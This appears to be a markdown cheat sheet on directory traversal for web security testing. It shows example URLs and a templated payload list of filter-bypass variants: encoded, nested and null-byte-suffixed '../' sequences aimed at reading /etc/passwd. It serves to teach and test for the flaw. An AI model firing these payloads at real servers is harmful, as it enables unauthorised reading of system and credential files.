---
title: Directory traversal
description: Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.
---

## Reading arbitrary files via directory traversal

This vulnerability starts of pretty simple. Just add `../` sequences to different inputs to try and reference different files from the server.
It can come from parameters or just from the URL path:

- `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
- `/var/www/images/../../../etc/passwd`

Deppending of the server's OS, you might be able to use different sequences:

- **Linux**:
  - `../`
- **Windows**:
  - `../`
  - `..\`

> I would test both sequences on both Linux and Windows, because you never know.

## Common obstacles to exploiting file path traversal vulnerabilities

There is a lot of ways to implement mechanisms to prevent path traversal, and bypassing them comes down to a bussiness logic vulnerabilities.
Try different encodings and different ways of indincating the same file.
Here you have some examples:

```text
{{ target-file etc/password }}
../../../../../../../../..{{ target-file /etc/password }}
../../../../../../../../..{{ target-file /etc/password }}%00{{ valid-extension .png }}
../../../../../../../../..{{ target-file /etc/password }}%0d{{ valid-extension .png }}
../../../../../../../../..{{ target-file /etc/password }}%0a{{ valid-extension .png }}
../../../../../../../../..{{ target-file /etc/password }}%0d%0a{{ valid-extension .png }}
../../../../../../../../..{{ target-file /etc/password }};{{ valid-extension .png }}
..../..../..../..../..../..../..../..../....{{ target-file /etc/password }}
....//....//....//....//....//....//....//....//..../{{ target-file /etc/password }}
....\/....\/....\/....\/....\/....\/....\/....\/....\{{ target-file /etc/password }}
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e{{ target-file /etc/password } url-all }
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e{{ target-file /etc/password } url-all, url-all }
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0{{ target-file /etc/password } url-all }
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc{{ target-file /etc/password } url-all }
{{ prefix-whitelist /var/www/images/ }}../../../../../../../../..{{ target-file /etc/password }}
```